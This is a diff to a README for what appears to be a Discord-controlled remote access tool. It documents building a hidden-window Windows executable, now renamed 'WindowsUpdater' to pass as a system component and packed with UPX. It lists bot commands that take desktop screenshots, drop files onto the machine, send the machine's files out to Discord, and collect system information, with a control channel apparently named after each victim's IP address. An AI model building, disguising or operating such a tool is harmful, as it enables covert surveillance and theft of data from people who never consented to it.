@@ -65,9 +65,10 @@ python main.py
    To create a single-file .exe (no console window):
 ```bash
 pyinstaller --onefile --noconsole
-  --name "Updater"
+  --name "WindowsUpdater"
   --add-data ".env;."
   --upx-dir "C:\upx"
+  --clean
   main.py
   ```
 
@@ -79,6 +80,7 @@ pyinstaller --onefile --noconsole
 - !screenshot → Capture and upload desktop screenshot
 - !load [folder] → Save attachments from the message to the PC
 - !download <path> → Upload file from PC to Discord
+- !sysinfo → Gets some stats
 
 **In the control channel (control-xxx.xxx.xxx.xxx)**:
 
